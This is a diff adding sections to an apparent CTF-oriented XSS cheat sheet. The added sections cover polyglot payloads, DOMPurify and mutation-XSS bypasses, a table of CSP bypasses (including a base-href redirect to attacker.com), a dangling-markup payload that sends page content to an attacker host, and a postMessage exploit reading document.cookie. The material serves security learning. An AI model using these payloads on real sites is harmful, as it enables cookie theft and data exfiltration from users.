@@ -197,6 +197,119 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 
 ---
 
+## Polyglot Payloads (work in multiple contexts)
+
+When you don't know the injection context (HTML body, attribute, JS string, URL), a polyglot fires in all of them.
+
+```html
+<!-- Compact polyglot (Gareth Heyes / 0xsobky) — single string -->
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+<!-- DOMPurify-bypass polyglot (when DOMPurify is the only sanitizer): -->
+<svg><svg onload=alert(1)>
+
+<!-- mXSS polyglot (mutation XSS — works when innerHTML re-parses): -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+<!-- Wordlist of polyglots:
+~/SecLists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt        -->
+```
+
+---
+
+## CSP Bypass Techniques
+
+When `Content-Security-Policy` blocks inline scripts, you need a permitted source.
+
+### Recon — see the CSP first
+```bash
+curl -sI http://TARGET/ | grep -i content-security
+# Look for: script-src, default-src, base-uri, object-src
+```
+
+### CSP Evaluator
+- Paste the policy at https://csp-evaluator.withgoogle.com/
+- Highlights weak directives
+
+### Common CSP bypasses
+
+| CSP weakness | Bypass |
+|--------------|--------|
+| `script-src 'unsafe-inline'` | XSS works directly — CSP is useless |
+| `script-src 'unsafe-eval'` | Use `eval(atob('...'))` to bypass framework sanitization |
+| `script-src *` | Any external host — load from your server |
+| `script-src https:` | Use any HTTPS CDN with hostable JS (gist, jsfiddle) |
+| `script-src 'self'` + JSONP endpoint | Load `/some/jsonp?callback=alert(1)` — JSONP becomes script |
+| `script-src 'self'` + file upload | Upload a `.js` to a permitted directory |
+| `script-src 'nonce-XYZ'` (static) | Reuse the nonce from page source: `<script nonce="XYZ">alert(1)</script>` |
+| `script-src 'strict-dynamic'` | Find a `<script>` that calls `document.createElement('script')` and inject through it |
+| `base-uri` missing | `<base href="//attacker.com">` redirects relative `<script src="/js/app.js">` to attacker |
+| `object-src` missing/`*` | `<object data="data:text/html,<script>alert(1)</script>">` |
+
+### Whitelist source abuse
+```html
+<!-- Common script-src whitelisted CDNs that host attacker-controllable code: -->
+script-src ajax.googleapis.com → load Angular and use template injection
+script-src cdnjs.cloudflare.com → many libs allow user-controlled inputs that lead to RCE
+script-src *.google.com → use Google Caja or AppEngine for hosted JS
+```
+
+### Dangling markup (no JS execution but data exfil)
+```html
+<!-- When CSP fully blocks script but allows form/img: -->
+<img src='http://attacker/?data=
+<!-- Page content from this point onward is sent to attacker as a URL -->
+```
+
+---
+
+## mXSS (Mutation XSS)
+
+When `innerHTML` re-parses HTML, browsers can MUTATE markup that DOMPurify already sanitized.
+
+```html
+<!-- Survives DOMPurify because <math> + <p title> mutates after re-parsing -->
+<math><mtext><table><mglyph><style><img title="</style><img src=x onerror=alert(1)>">
+
+<!-- Trigger: anywhere innerHTML is read then re-written (e.g., jQuery html().html()) -->
+```
+
+> mXSS is rare in CTFs but appears in advanced XSS labs (HackTheBox Pro, intigriti CTFs).
+
+---
+
+## postMessage XSS (Cross-Window Messaging)
+
+```html
+<!-- Vulnerable code (no origin check): -->
+window.addEventListener('message', e => {
+    document.getElementById('output').innerHTML = e.data;   // sink!
+});
+
+<!-- Exploit (from your malicious page): -->
+<iframe src="https://victim.com" id="v"></iframe>
+<script>
+document.getElementById('v').onload = () => {
+    document.getElementById('v').contentWindow.postMessage(
+        '<img src=x onerror=alert(document.cookie)>', '*'
+    );
+};
+</script>
+```
+
+> Check for vulnerable listeners with: `grep -r 'addEventListener.*message' static/js/`
+
+---
+
+## Self-XSS → Stored / DoS
+
+Self-XSS (XSS that only fires for yourself) seems useless — UNTIL you chain it:
+- Combined with CSRF → forces victim to inject XSS into their own profile
+- In an admin tool → cause persistent self-DoS for admin (locked out of UI)
+- Cookie storage → write malicious payload to localStorage, fires when victim visits
+
+---
+
 ## Decision Tree When Stuck
 
 ```
